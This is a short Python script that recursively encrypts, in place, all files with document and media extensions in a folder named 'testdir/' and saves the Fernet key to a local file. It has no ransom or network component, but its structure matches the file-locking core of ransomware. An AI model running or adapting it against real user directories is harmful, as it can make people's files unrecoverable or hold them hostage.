import os
from cryptography.fernet import Fernet

def encrypt_file(key, filepath):
    # Generate cipher using the encryption key
    cipher = Fernet(key)

    # Read the file content
    with open(filepath, 'rb') as file:
        file_data = file.read()

    # Encrypt the file content
    encrypted_data = cipher.encrypt(file_data)

    # Write the encrypted data back to the file
    with open(filepath, 'wb') as file:
        file.write(encrypted_data)

def encrypt_files_in_directory(key, directory, target_extensions):
    for root, dirs, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)

            # Check if the file has any of the target extensions
            _, file_extension = os.path.splitext(file)
            if file_extension in target_extensions:
                encrypt_file(key, filepath)

def save_key_to_file(key, key_file_path):
    with open(key_file_path, 'wb') as key_file:
        key_file.write(key)

if __name__ == "__main__":
    # Generate a random encryption key
    encryption_key = Fernet.generate_key()

    # Specify the directory to encrypt
    directory_to_encrypt = 'testdir/'

    # Specify the target file extensions to encrypt (e.g., ['.txt', '.docx'])
    target_extensions = ['.txt', '.pdf', '.csv', '.docx', '.mp4']

    # Encrypt files with the target extensions in the directory
    encrypt_files_in_directory(encryption_key, directory_to_encrypt, target_extensions)

    # Specify the file path to save the key
    key_file_path = 'encryption_key.key'

    # Save the encryption key to a file
    save_key_to_file(encryption_key, key_file_path)
